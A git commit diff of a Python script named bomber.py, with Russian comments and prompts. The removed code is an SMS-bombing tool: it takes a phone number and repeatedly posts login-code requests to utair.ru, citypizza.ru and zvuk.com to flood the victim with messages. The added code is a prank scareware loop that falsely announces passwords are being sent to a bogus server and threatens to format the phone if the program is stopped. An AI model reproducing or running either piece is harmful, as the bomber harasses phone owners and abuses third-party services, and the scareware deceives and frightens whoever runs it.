940aa12133ee6fb0a56b76a30c23c252b8fbef80
NikitaSokov <45041191+NikitaSokov@users.noreply.github.com>
2020-10-08 23:54:58 +0700

    Update bomber.py

--- bomber.py
+++ bomber.py
@@ -1,70 +1,16 @@
-import sys
-import requests
 import time
-#Лого
-print (''' ____                ____            __                        
-/\  _`\             /\  _`\         /\ \                       
-\ \ \L\ \  __  __   \ \,\L\_\    ___\ \ \/'\     ___   __  __  
- \ \  _ <'/\ \/\ \   \/_\__ \   / __`\ \ , <    / __`\/\ \/\ \ 
-  \ \ \L\ \ \ \_\ \    /\ \L\ \/\ \L\ \ \ \\`\ /\ \L\ \ \ \_/ |
-   \ \____/\/`____ \   \ `\____\ \____/\ \_\ \_\ \____/\ \___/ 
-    \/___/  `/___/> \   \/_____/\/___/  \/_/\/_/\/___/  \/__/  
-               /\___/                                          
-               \/__/                                         
-''')
-
-time.sleep(2)
-print ("НОМЕР НУЖНО ПИСАТЬ БЕЗ ЗНАКА +")
-#переменные
-n = input("Укажите номер: ")
-n2 = ("(" + n[1:-7] + ")" + n[4:-4] + ("-") + n[7:-2] + ("-") + n[9:]) 
-n3= ("7"+n[1:])
-n4=("+"+n3)
-link1 = ('https://zvuk.com/api/tiny/get-otp?phone=' + (n4) + ("&length=4&type=login"))
-print ("Спам запущен на номер", n)
-
-#all
-
-
-# utair
-
+import random
+print ("Внимание! Выполняется отправка всех ваших пароле на сервер fttp://125.432.73.352:7777")
+time.sleep(3)
+print ("При попытке остановить программу Ваш телефон будет отформатирован без возможности восстановления.")
+time.sleep(6)
 while True:
+  time.sleep(0.5)
+  print("Операция " + str(random.randint(10000, 99999)) +" выполнена! Файл передан.")
 
 
- while True:
-  r = requests.post('https://b.utair.ru/api/v1/login/',
-  data = {'login':n},
-  headers = {
-  'Accept-Language':'en-US,en;q=0.5',
-  'Connection':'keep-alive',
-  'Host':'b.utair.ru',
-  'origin':'https://www.utair.ru',
-  'Referer':'https://www.utair.ru/'})
-  time.sleep(5)   
-  break
-#citypizza
 
- while True:
-   requests.post('https://www.citypizza.ru/auth/sendphone/',
-   data = {'phone':n2},
-   headers = {
-   'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
-   'Connection':'keep-alive',
-   'Host':'www.citypizza.ru',
-   'Origin':'""',
-   'Referer':'https://www.citypizza.ru/auth/register/'})
-   time.sleep(5)
-   break
-         
- while True:
-  r = requests.post((link1),
-  data = {'phone':n3, 'length':'4','type':'login'},
-  headers = {
-  'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
-  'Connection':'keep-alive',
-  'Host':'zvuk.com',
-  'Origin':'https://zvuk.com',
-  'Referer':'https://zvuk.com/'})
-  time.sleep(5)
-  break
+
+
+
   
